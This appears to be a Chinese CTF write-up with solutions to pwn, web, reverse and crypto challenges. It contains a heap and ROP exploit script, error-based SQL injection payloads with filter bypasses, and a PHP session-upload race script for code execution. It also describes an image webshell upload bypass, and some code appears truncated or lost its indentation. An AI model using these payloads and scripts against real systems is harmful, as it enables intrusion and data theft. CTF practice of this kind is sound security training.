        sx = addr + libc.sym['setcontext']+53
        lg('addr',addr)
        fake = '\x01'+'\x01'*3
        fake = fake.ljust(0x40,'\x01')
        edit(fake+p64(free_hook)+p64(heap+0xdb0)+p64(heap+0xdf0)+p64(heap+0xe10)+p64(heap+0xe50)+p64(heap+0xf68)+p64(heap+0xf68))
        #----------        ret = addr + 0x0000000000006388
        pop_rdi = addr + 0x00000000000215bf
        pop_rsi = addr + 0x0000000000023eea
        pop_rdx = addr + 0x0000000000001b96
        read_m = addr + libc.sym['read']
        write_m = addr + libc.sym['write']
        syscall = addr + 0x00000000000d2745
        pop_rax = addr + 0x0000000000043ae8
        add_ret = addr +0x000000000003efcd
        open_m = addr + libc.sym['open']
        # add(0x10)
        # pay = 'a'*8+p64(sx)
        # # pay = pay.ljust(0x)
        # edit(pay)
        # # delete()
        # #---------        # for i in  range(1):
        #     add(0x40)
        # add(0x10)
        add(0x10)
        pay =p64(sx)
        edit(pay)
        add(0x50)
        edit(p64(heap+0xe10)+p64(ret)+p64(pop_rdi))
        rop = p64(pop_rdi)+p64(heap+0xdf0)+p64(pop_rsi)+p64(0) 
        # rop+= p64(open_m)
        rop+= p64(pop_rax)+p64(2)+p64(syscall)
        rop+= p64(add_ret)    
        # +p64(3)
        # +p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x20)+p64(read)
        add(0x40)
        edit(rop)
        add(0x70)
        rop2 = p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x30)+p64(read_m)
        rop2+= p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x30)+p64(write_m)
        edit(rop2)
        add(0x30)
        edit('./flag\x00')
        add(0x20)
        edit(p64(ret))
        # add(0x40)
        # dbg()
        lg('sx',sx)
        # debug([0xEA9])
        delete()
        it()
    if __name__ == '__main__':
        exp()
## web
###  web1 easy_sql注入
payload
    uname=admin&passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c),0x7e),1)%23&Submit=%E7%99%BB%E5%BD%95
‘)闭合，然后 报错注入。猜测得到有一个表叫flag。发现过滤了information等系统库
根据
    uname=admin&passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c),0x7e),1)%23&Submit=%E7%99%BB%E5%BD%95
    uname=admin&passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e),1)%23&Submit=%E7%99%BB%E5%BD%95
爆出列名1
    uname=admin&passwd=a')/**/and/**/updatexml(1,concat(0x7e,(reverse(select `f30f48fe-6b1b-41e8-96eb-c297827bc695` from flag)),0x7e),1)%23&Submit=%E7%99%BB%E5%BD%95
然后substr切割一下 还有后半段
###  web2 source
扫描后台 .index.swo
发现是原题
直接上payload
    /?rc=ReflectionMethod&ra=User&rb=q&rd=getDocComment
###  web3 middle_source
扫描后台 /.listing
发现了 youcanseeeeeeee.php 是个phpinfo界面
然后读取到session的存储位置，写出脚本。
    # coding=utf-8
    import io
    import requests
    import threading
    sessid = 'flag'
    data = {"cmd": "var_dump(readfile('/etc'));"}
    url = "靶机"
    def write(session):
    while True:
    f = io.BytesIO(b'a' * 1024 * 50)
    resp = session.post(url,
    data={'PHP_SESSION_UPLOAD_PROGRESS': ''},
    files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})
    def read(session):
    while True:
    data["cf"] = "../../../../../var/lib/php/sessions/if/sess_flag"#phpinfo中的位置
    resp = session.post(url,data=data)
    if 'tgao.txt' in resp.text:
    print(resp.text)
    event.clear()
    else:
    pass
    if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
    for i in range(1, 30):
    threading.Thread(target=write, args=(session,)).start()
    for i in range(1, 30):
    threading.Thread(target=read, args=(session,)).start()
    event.set()
很快就能找到位置 出flag
###  web3 upload
一上来就是图片马的二次渲染绕过，然后结合example.php后面我们知道，这里还要一zip来配合使用，达到的目的就是解压后有shell。
然后我们不慌不忙的掏出我们的图片马 ，再把他打包成压缩包。 然后现在要绕过对于zip的绕过。上传解压马儿就可以了。
这里对于zip的绕过
    图片马的最后记得加上
    #define width 1
    #define height 1
php-gd2的那个图片马即可，
上传 解压
就在example下面 然后flag
还得重新读一下。
## re
###  glass
使用native层方法checkflag，先经过RC4，再经过另一个流加密，密钥都是12345678  
还原第二个流加密：
    #include 
    #include 
    void decode(BYTE* out, BYTE* key)
    {
        for (int i = 0;i b，控制字节为2时ab。  
最后的map填写出来应该是这样的：  
1, 4, 2, 5, 3,  
5, 3, 1, 4, 2,  
3, 5, 4, 2, 1,  
2, 1, 5, 3, 4,  
4, 2, 3, 1, 5
原map给了两个值，输入的时候对应字节应该是0，得到输入序列1425353142350212150442315，md5得到flag
crypto  
imageencrypt  
先把testimage和加密后的直接异或可以得到key1和key2的值  
反推出bins，然后截取还原出x数列  
在0.1到3.0之间搜索r的值,发现1.2满足,然后反解x0  
得到后续的x数列就可以还原图像了
    import random
    from hashlib import *
    r=1.2
    def generate(x):
        return round(r*x*(3-x),6)
    def encrypt(pixel,key1,key2,x0,m,n):
        num = m*n//8    
        seqs = []
        x = x0
        bins = ''
        tmp = []
        for i in range(num):
            x = generate(x)
            tmp.append(x)